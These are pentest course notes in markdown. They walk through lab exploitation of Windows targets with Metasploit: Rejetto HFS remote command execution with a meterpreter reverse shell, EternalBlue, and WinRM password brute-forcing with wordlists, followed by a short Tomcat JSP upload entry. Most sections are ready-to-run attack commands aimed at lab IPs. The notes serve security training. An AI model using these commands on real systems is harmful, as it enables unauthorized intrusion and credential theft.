# Exploitation

## Windows Exploitation

### HFS (HTTP File Server) <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

A **HFS** (HTTP File Server) is a file and documents sharing web server.

* Rejetto HFS - free open source HTTP file server

> ðŸ”¬ [Windows: HTTP File Server](https://attackdefense.com/challengedetails?cid=1945)
>
> * Target IP: 10.0.17.144
> * Exploit the target with the appropriate Metasploit Framework module
> * [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution](https://www.exploit-db.com/exploits/39161)

```bash
service postgresql start && msfconsole -q
msf5 > db_status
msf5 > set RHOSTS 10.0.17.144
msf5 > workspace -a HFS
```

* Perform an `nmap` scan directly into MSF

```bash
msf5 > db_nmap -sS -sV -O 10.0.17.144
```

<figure><img src="../../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

```bash
msf5 > search rejetto
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 > info
msf5 > run
```

<figure><img src="../../../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

* Type of payload can be changed base on the target O.S. architecture

```bash
msf5 > set payload windows/x64/meterpreter/reverse_tcp
msf5 > options
msf5 > run
```

```sh
shell
cd /
dir
type flag.txt
```

<figure><img src="../../../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `f74c8347798f4082daf4b4570dba094a`
{% endhint %}

### SMB - MS17-010 EternalBlue <a href="#smb-ms17-010-eternalblue" id="smb-ms17-010-eternalblue"></a>

* [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
* [EternalBlue VA](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va#eternalblue)
  * **EternalBlue** takes advantage of a Windows SMBv1 protocol vulnerability
  * Patch was released in March 2017

> ðŸ”¬ Check the [Lab 2 - Eternal Blue here](../system-host-based-attack/windows-operating-system/smb.md)

* Some MSF useful commands from my Home Lab (`Kali VM + Win 2008_R2 Server`)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS <Target IP>
setg RHOST <Target IP>
workspace -a EternalBlue

db_nmap -sS -sV -O <Target IP>
```

```bash
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
options
run

search type:exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
options
run
```

### WinRM <a href="#winrm" id="winrm"></a>

* Identify WinRM users with MSF and exploit WinRM by obtaining access credentials.
* Default WinRM HTTP port is **`5985`** and HTTPS **`5986`**

> [ðŸ”¬ WinRM Attack la](../system-host-based-attack/windows-operating-system/winrm.md)

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS <Target IP>
setg RHOST <Target IP>
workspace -a WinRM

db_nmap -sS -sV -O -p- <Target IP>
# Port 5985 is set up for WinRM
```

```bash
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods
options
run

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
run
```

### Apache Tomcat <a href="#apache-tomcat" id="apache-tomcat"></a>

[**`Apache Tomcat`**](https://tomcat.apache.org/) is a free open source Java servlet web server, _build to host dynamic websites and web apps developed in **Java**_.

* Tomcat default TCP port is **`8080`**
* Apache web server host HTML/PHP web apps, instead
* Apache Tomcat < **`v.8.5.23`** is vulnerable to a Java Service Page (JSP) Upload Bypass / RCE

> ðŸ”¬ [Windows: Java Web Server](https://attackdefense.com/challengedetails?cid=1948)
>
> * Target IP: `10.2.24.113`
> * Exploit the target with the appropriate Metasploit Framework module
> * [Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution](https://www.exploit-db.com/exploits/42966)









